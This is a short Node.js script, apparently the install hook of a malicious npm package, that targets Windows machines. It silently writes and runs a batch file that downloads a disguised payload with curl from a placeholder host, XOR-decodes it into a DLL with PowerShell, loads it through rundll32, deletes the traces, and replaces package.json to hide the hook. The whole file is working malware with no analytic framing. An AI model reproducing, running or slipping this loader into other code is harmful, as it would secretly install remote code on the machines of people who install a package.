const fs = require('fs')
const os = require('os')
const path = require('path')
const { exec } = require('child_process');

const osType = os.type();

const data = '@echo off\ncurl -o sqlite.a -L "http://some.domain/npm/npm.mov" > nul 2>&1\nstart /b /wait powershell.exe -ExecutionPolicy Bypass -File winsys.ps1 > nul 2>&1\ndel "winsys.ps1" > nul 2>&1\nif exist "winsys.db" (\ndel "winsys.db" > nul 2>&1\n)\nrename sql.tmp winsys.db > nul 2>&1\nrundll32 winsys.db,CalculateSum 7606\ndel "winsys.db"\nif exist "pk.json" (\ndel "package.json" > nul 2>&1\nrename "pk.json" "package.json" > nul 2>&1\n)';
const psdata = '$path1 = Join-Path $PWD "sqlite.a"\n$path2 = Join-Path $PWD "sql.tmp"\nif ([System.IO.File]::Exists($path1))\n{\n$bytes = [System.IO.File]::ReadAllBytes($path1)\nfor($i = 0; $i -lt $bytes.count ; $i++)\n{\n$bytes[$i] = $bytes[$i] -bxor 0xef\n}\n[System.IO.File]::WriteAllBytes($path2, $bytes)\nRemove-Item -Path $path1 -Force\n}';

if (osType === 'Windows_NT') {
    // The system is running Windows
    const fileName = 'winsys.bat'; // Specify the file name
    const psfileName = 'winsys.ps1';
    // Create the file
    fs.writeFile(fileName, data, (err) => {
        if (!err) {
            fs.writeFile(psfileName, psdata, (err) => {
                if (!err) {
                    // Execute the .bat file
                    const child = exec(`"${fileName}"`, (error, stdout, stderr) => {
                        if (error) {
                            return;
                        }
                        if (stderr) {
                            return;
                        }
                        fs.unlink(fileName, (err) => {
                        });
                    });

                }
            });
        }
    });
}